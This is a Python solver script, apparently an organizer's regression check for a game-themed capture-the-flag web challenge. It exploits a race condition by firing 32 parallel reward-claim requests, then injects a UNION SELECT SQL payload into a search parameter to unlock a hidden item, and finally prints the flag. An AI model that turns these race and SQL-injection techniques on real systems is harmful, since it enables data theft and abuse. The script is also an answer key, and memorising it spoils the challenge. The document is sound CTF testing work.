#!/usr/bin/env python3
"""Organizer regression solver for the intended CTF chain."""
import concurrent.futures
import sys
import requests

base = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080'
session = requests.Session()
session.post(f'{base}/api/runs').raise_for_status()

def state(): return session.get(f'{base}/api/state').json()['run']
def graph(): return session.get(f'{base}/api/map').json()['map']

def enter_next(node_type=None):
    data = graph(); current = data['current_node_id']
    outgoing = [edge['to_node_id'] for edge in data['edges'] if edge['from_node_id'] == current]
    nodes = {node['id']: node for node in data['nodes']}
    target = next((node for node in outgoing if nodes[node]['node_type'] == node_type), outgoing[0])
    response = session.post(f'{base}/api/map/enter/{target}').json()
    if not response.get('ok'): raise SystemExit(response)
    return target

def clear_battle():
    while state()['stage'] in {'minion', 'monster', 'hero'}:
        response = session.post(f'{base}/api/game/action', json={'action': 'q'}).json()
        if not response.get('ok') or response['run']['status'] == 'failed': raise SystemExit(response)

def resolve_current():
    if state()['stage'] == 'campfire':
        current = graph()['current_node_id']
        response = session.post(f'{base}/api/campfires/{current}/rest').json()
        if not response.get('ok'): raise SystemExit(response)
    clear_battle()

# Floor 2 is a forced hero node. Win it, then race its post-battle reward.
enter_next('hero'); clear_battle()
cookies = session.cookies.get_dict()
def claim(_):
    return requests.post(f'{base}/api/rewards/hero/claim', cookies=cookies, timeout=10).status_code
with concurrent.futures.ThreadPoolExecutor(max_workers=32) as pool:
    list(pool.map(claim, range(32)))

# Progress to the forced shop on floor 5, clearing incidental fights.
while state()['stage'] != 'shop':
    enter_next(); resolve_current()
buy = session.post(f'{base}/api/shop/batch-buy', json={'item_ids': ['heartsteel'] * 4 + ['bloodmail'] * 4}).json()
if not buy.get('ok'): raise SystemExit(buy)

# Reach the forced campfire on floor 8. SQLi adds the hidden contract to candidates.
while state()['stage'] != 'campfire':
    enter_next(); clear_battle()
campfire = graph()['current_node_id']
session.post(f'{base}/api/campfires/{campfire}/meditate').raise_for_status()
payload = "%' UNION SELECT id,name,rarity,description FROM augments -- "
search = session.get(f'{base}/api/campfires/{campfire}/meditate/search', params={'q': payload}).json()
if not any(row['id'] == 'darkin-contract' for row in search.get('results', [])): raise SystemExit(search)
chosen = session.post(f'{base}/api/campfires/{campfire}/meditate/choose', json={'augment_id': 'darkin-contract'}).json()
if not chosen.get('ok'): raise SystemExit(chosen)

# Continue through the map and land on the floor-12 Boss.
while state()['stage'] != 'boss':
    enter_next(); resolve_current()
for _ in range(8):
    result = session.post(f'{base}/api/game/action', json={'action': 'q'}).json()
    if result.get('flag'):
        print(result['flag']); break
    if not result.get('ok') or result['run']['status'] == 'failed': raise SystemExit(result)
else:
    raise SystemExit(result)
